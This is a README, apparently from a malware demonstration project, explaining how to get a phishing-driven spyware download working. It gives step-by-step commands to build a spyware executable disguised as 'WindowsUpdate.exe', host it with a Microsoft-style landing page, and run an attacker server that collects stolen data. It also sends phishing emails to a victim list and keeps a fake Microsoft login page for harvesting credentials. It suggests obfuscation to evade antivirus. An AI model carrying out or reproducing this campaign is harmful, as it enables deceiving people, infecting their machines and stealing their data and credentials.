# How to Make the Download Work

## Problem
When victim clicks "Download Update" button, nothing happens or file doesn't download.

## Root Causes
1. **WindowsUpdate.exe doesn't exist** in the delivery folder
2. **Web server not running** on port 8000
3. **Wrong IP address** in the HTML link

## Solution

### Step 1: Build and Setup (ONE TIME)
```powershell
cd malicious_code\delivery\delivery_technique1
python setup_delivery.py
```

This will:
- Build WindowsUpdate.exe from spyware_main.py
- Copy it to the delivery folder
- Verify all files exist

### Step 2: Start Web Server
```powershell
# Terminal 1 - Stay in delivery_technique1 folder
python -m http.server 8000
```

This serves the files:
- `http://192.168.5.128:8000/windows-update.html` - Landing page
- `http://192.168.5.128:8000/WindowsUpdate.exe` - Spyware download

### Step 3: Start Attacker Server
```powershell
# Terminal 2
cd ..\..\
python attacker_server.py
```

Receives stolen data from infected victims on port 5555.

### Step 4: Send Phishing Emails
```powershell
# Terminal 3
cd delivery\delivery_technique1
python auto_send_phishing.py
```

## How It Works

1. **Victim opens email** → Sees professional Microsoft-style message
2. **Clicks "Download Update"** → Opens `windows-update.html` in browser
3. **Clicks download button** → Browser downloads `WindowsUpdate.exe`
4. **Victim runs exe** → Spyware installs and runs `spyware_main.py` code
5. **Spyware runs** → Collects data and sends to attacker server

## Files in Delivery Folder

```
delivery_technique1/
├── WindowsUpdate.exe          ← The malware (built from spyware_main.py)
├── windows-update.html        ← Landing page (download button)
├── fake-microsoft-login.html  ← Credential harvester
├── auto_send_phishing.py      ← Email sender
└── email_dataset.csv          ← Victim email list
```

## Testing Without Sending Email

```powershell
# 1. Start web server
cd delivery\delivery_technique1
python -m http.server 8000

# 2. Open in browser
start http://localhost:8000/windows-update.html

# 3. Click download button
# 4. Run WindowsUpdate.exe (in VM/safe environment!)
```

## Common Issues

### "WindowsUpdate.exe not found"
**Fix:** Run `python setup_delivery.py` first

### "Download doesn't start"
**Fix:** Make sure web server is running on port 8000

### "Port 8000 already in use"
**Fix:** 
```powershell
# Find process using port 8000
Get-NetTCPConnection -LocalPort 8000 | Select-Object -Property OwningProcess

# Kill it
Stop-Process -Id <ProcessID>
```

### "Exe doesn't run"
**Fix:** Windows Defender might block it. This is expected! In real attack:
- Victim would disable antivirus
- Or attacker would obfuscate the exe

## Security Note
The built exe **WILL** be detected by antivirus because:
- It's not obfuscated
- It opens sockets and sends data
- Educational code has known signatures

For demonstration only!
